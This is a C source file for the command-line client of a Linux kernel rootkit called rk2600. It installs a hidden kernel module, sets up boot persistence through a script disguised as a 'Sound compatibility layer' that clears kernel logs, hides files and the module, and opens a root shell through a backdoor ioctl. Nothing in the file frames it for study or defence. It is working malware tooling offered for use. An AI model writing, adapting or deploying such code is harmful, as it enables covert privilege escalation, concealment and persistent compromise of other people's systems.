#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "rk2600_protocol.h"

#define EXIT_USAGE 2

/* ------------------------------------------------------------------ helpers */

static int open_ctl(void)
{
	int fd = open(RK2600_DEVICE_PATH, O_RDWR | O_CLOEXEC);

	if (fd < 0)
		fprintf(stderr, "Cannot open %s: %s\n",
			RK2600_DEVICE_PATH, strerror(errno));
	return fd;
}

static bool name_is_valid(const char *name)
{
	size_t len;

	if (name == NULL || name[0] == '\0') {
		fprintf(stderr, "NAME must not be empty.\n");
		return false;
	}
	len = strlen(name);
	if (len > RK2600_NAME_MAX) {
		fprintf(stderr, "NAME exceeds %u bytes.\n",
			(unsigned)RK2600_NAME_MAX);
		return false;
	}
	if (strchr(name, '/') != NULL) {
		fprintf(stderr, "NAME must be a single entry, not a path.\n");
		return false;
	}
	if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
		fprintf(stderr, "NAME cannot be '.' or '..'.\n");
		return false;
	}
	return true;
}

static int spawn(char *const argv[])
{
	pid_t pid;
	int wst;

	pid = fork();
	if (pid < 0) {
		perror("fork");
		return -1;
	}
	if (pid == 0) {
		execvp(argv[0], argv);
		_exit(127);
	}
	if (waitpid(pid, &wst, 0) < 0) {
		perror("waitpid");
		return -1;
	}
	return (WIFEXITED(wst) && WEXITSTATUS(wst) == 0) ? 0 : -1;
}

static int copy_file(const char *src, const char *dst)
{
	int sfd;
	int dfd;
	char buf[4096];
	ssize_t nr;

	sfd = open(src, O_RDONLY);
	if (sfd < 0) {
		fprintf(stderr, "Cannot open %s: %s\n", src, strerror(errno));
		return -1;
	}
	dfd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (dfd < 0) {
		fprintf(stderr, "Cannot create %s: %s\n", dst, strerror(errno));
		close(sfd);
		return -1;
	}
	while ((nr = read(sfd, buf, sizeof(buf))) > 0) {
		if (write(dfd, buf, (size_t)nr) != nr) {
			fprintf(stderr, "Write error on %s: %s\n",
				dst, strerror(errno));
			close(sfd);
			close(dfd);
			return -1;
		}
	}
	close(sfd);
	if (close(dfd) < 0) {
		fprintf(stderr, "Close error on %s: %s\n",
			dst, strerror(errno));
		return -1;
	}
	return nr < 0 ? -1 : 0;
}

static int ensure_dir(const char *path)
{
	char tmp[PATH_MAX];
	char *p;
	size_t len;

	len = strlen(path);
	if (len == 0 || len >= sizeof(tmp))
		return -1;
	memcpy(tmp, path, len + 1);

	for (p = tmp + 1; *p != '\0'; p++) {
		if (*p != '/')
			continue;
		*p = '\0';
		if (mkdir(tmp, 0755) < 0 && errno != EEXIST)
			return -1;
		*p = '/';
	}
	if (mkdir(tmp, 0755) < 0 && errno != EEXIST)
		return -1;
	return 0;
}

/* ---------------------------------------------------------------- commands */

static int cmd_status(void)
{
	struct rk2600_status st;
	int fd;

	memset(&st, 0, sizeof(st));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	if (ioctl(fd, RK2600_IOC_STATUS, &st) < 0) {
		fprintf(stderr, "Status request failed: %s\n",
			strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);

	printf("API version  : %u\n", (unsigned)st.api_version);
	printf("Module hidden: %s\n",
	       (st.flags & RK2600_FLAG_HIDDEN) ? "yes" : "no");

	if (st.api_version != RK2600_API_VERSION)
		fprintf(stderr, "Warning: expected API v%u\n",
			(unsigned)RK2600_API_VERSION);
	return 0;
}

static int cmd_privesc(void)
{
	int fd;

	fd = open_ctl();
	if (fd < 0)
		return -1;

	if (ioctl(fd, RK2600_IOC_ELEVATE) < 0) {
		fprintf(stderr, "Elevation failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);

	if (geteuid() != 0) {
		fprintf(stderr, "Elevation failed: still euid=%ld\n",
			(long)geteuid());
		return -1;
	}

	execlp("/bin/sh", "sh", (char *)NULL);
	perror("exec /bin/sh");
	return -1;
}

static int cmd_hide(const char *name)
{
	struct rk2600_name_request req;
	int fd;

	memset(&req, 0, sizeof(req));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	strncpy(req.name, name, RK2600_NAME_MAX);
	if (ioctl(fd, RK2600_IOC_HIDE, &req) < 0) {
		fprintf(stderr, "Hide failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);
	printf("Hidden: %s\n", name);
	return 0;
}

static int cmd_unhide(const char *name)
{
	struct rk2600_name_request req;
	int fd;

	memset(&req, 0, sizeof(req));
	fd = open_ctl();
	if (fd < 0)
		return -1;

	strncpy(req.name, name, RK2600_NAME_MAX);
	if (ioctl(fd, RK2600_IOC_UNHIDE, &req) < 0) {
		fprintf(stderr, "Unhide failed: %s\n", strerror(errno));
		close(fd);
		return -1;
	}
	close(fd);
	printf("Unhidden: %s\n", name);
	return 0;
}

static int cmd_install(const char *ko_path)
{
	struct utsname uts;
	char dir[PATH_MAX];
	char dest[PATH_MAX + sizeof(RK2600_MODULE_FILE)];
	FILE *fp;

	if (geteuid() != 0) {
		fprintf(stderr, "Install requires root.\n");
		return -1;
	}
	if (access(ko_path, R_OK) < 0) {
		fprintf(stderr, "Cannot read %s: %s\n",
			ko_path, strerror(errno));
		return -1;
	}
	if (uname(&uts) < 0) {
		perror("uname");
		return -1;
	}

	snprintf(dir, sizeof(dir), "/lib/modules/%s/extra", uts.release);
	if (ensure_dir(dir) < 0) {
		fprintf(stderr, "Cannot create %s: %s\n",
			dir, strerror(errno));
		return -1;
	}

	snprintf(dest, sizeof(dest), "%s/%s", dir, RK2600_MODULE_FILE);
	printf("Copying %s -> %s\n", ko_path, dest);
	if (copy_file(ko_path, dest) < 0)
		return -1;

	if (ensure_dir(RK2600_PERSIST_DIR) < 0) {
		fprintf(stderr, "Cannot create %s\n", RK2600_PERSIST_DIR);
		return -1;
	}

	fp = fopen(RK2600_PERSIST_PATH, "w");
	if (!fp) {
		fprintf(stderr, "Cannot create %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
		return -1;
	}
	fprintf(fp,
		"#!/bin/sh\n"
		"# Sound compatibility layer\n"
		"printk_lvl=$(cat /proc/sys/kernel/printk | cut -f1)\n"
		"echo 1 > /proc/sys/kernel/printk\n"
		"/sbin/insmod %s 2>/dev/null\n"
		"echo \"$printk_lvl\" > /proc/sys/kernel/printk\n"
		"dmesg -c > /dev/null 2>&1\n",
		dest);
	fclose(fp);
	if (chmod(RK2600_PERSIST_PATH, 0755) < 0)
		fprintf(stderr, "Warning: chmod %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));
	printf("Persistence: %s\n", RK2600_PERSIST_PATH);

	/* Ensure the local service is enabled for persistence */
	char *rcupdate_argv[] = {"rc-update", "add", "local", "default", NULL};

	spawn(rcupdate_argv);

	printf("Loading module...\n");
	char *insmod_argv[] = {"insmod", dest, NULL};

	if (spawn(insmod_argv) < 0)
		fprintf(stderr,
			"Warning: insmod failed (already loaded?).\n");

	printf("Installed.\n");
	return 0;
}

static int cmd_uninstall(void)
{
	struct utsname uts;
	char dest[PATH_MAX];
	int fd;

	if (geteuid() != 0) {
		fprintf(stderr, "Uninstall requires root.\n");
		return -1;
	}

	/* Unhide module so rmmod can find it */
	fd = open_ctl();
	if (fd >= 0) {
		ioctl(fd, RK2600_IOC_MODSHOW);
		close(fd);
	}

	char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};

	if (spawn(rmmod_argv) < 0)
		fprintf(stderr,
			"Warning: rmmod failed (module not loaded?).\n");

	if (uname(&uts) == 0) {
		snprintf(dest, sizeof(dest),
			 "/lib/modules/%s/extra/%s",
			 uts.release, RK2600_MODULE_FILE);
		if (unlink(dest) < 0 && errno != ENOENT)
			fprintf(stderr, "Cannot remove %s: %s\n",
				dest, strerror(errno));
	}

	if (unlink(RK2600_PERSIST_PATH) < 0 && errno != ENOENT)
		fprintf(stderr, "Cannot remove %s: %s\n",
			RK2600_PERSIST_PATH, strerror(errno));

	printf("Uninstalled.\n");
	return 0;
}

/* ------------------------------------------------------------------- main */

static void print_usage(FILE *out, const char *prog)
{
	fprintf(out,
		"Usage: %s <command> [args]\n"
		"\n"
		"Commands:\n"
		"  install [ko]   Install module and set up persistence\n"
		"  uninstall      Remove module and persistence\n"
		"  status         Show module status\n"
		"  privesc        Elevate to root shell\n"
		"  hide <name>    Hide a directory entry\n"
		"  unhide <name>  Reveal a directory entry\n",
		prog);
}

int main(int argc, char **argv)
{
	const char *cmd;

	if (argc < 2) {
		print_usage(stderr, argv[0]);
		return EXIT_USAGE;
	}

	cmd = argv[1];

	if (strcmp(cmd, "--help") == 0 || strcmp(cmd, "-h") == 0) {
		print_usage(stdout, argv[0]);
		return 0;
	}

	if (strcmp(cmd, "status") == 0) {
		if (argc != 2) {
			fprintf(stderr, "status takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_status() == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "privesc") == 0) {
		if (argc != 2) {
			fprintf(stderr, "privesc takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_privesc() == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "hide") == 0) {
		if (argc != 3) {
			fprintf(stderr, "hide requires exactly one NAME.\n");
			return EXIT_USAGE;
		}
		if (!name_is_valid(argv[2]))
			return EXIT_USAGE;
		return cmd_hide(argv[2]) == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "unhide") == 0) {
		if (argc != 3) {
			fprintf(stderr, "unhide requires exactly one NAME.\n");
			return EXIT_USAGE;
		}
		if (!name_is_valid(argv[2]))
			return EXIT_USAGE;
		return cmd_unhide(argv[2]) == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "install") == 0) {
		if (argc > 3) {
			fprintf(stderr, "install takes at most one argument.\n");
			return EXIT_USAGE;
		}
		const char *ko = (argc == 3) ? argv[2] : "./" RK2600_MODULE_FILE;

		return cmd_install(ko) == 0 ? 0 : 1;
	}

	if (strcmp(cmd, "uninstall") == 0) {
		if (argc != 2) {
			fprintf(stderr, "uninstall takes no arguments.\n");
			return EXIT_USAGE;
		}
		return cmd_uninstall() == 0 ? 0 : 1;
	}

	fprintf(stderr, "Unknown command: %s\n", cmd);
	print_usage(stderr, argv[0]);
	return EXIT_USAGE;
}
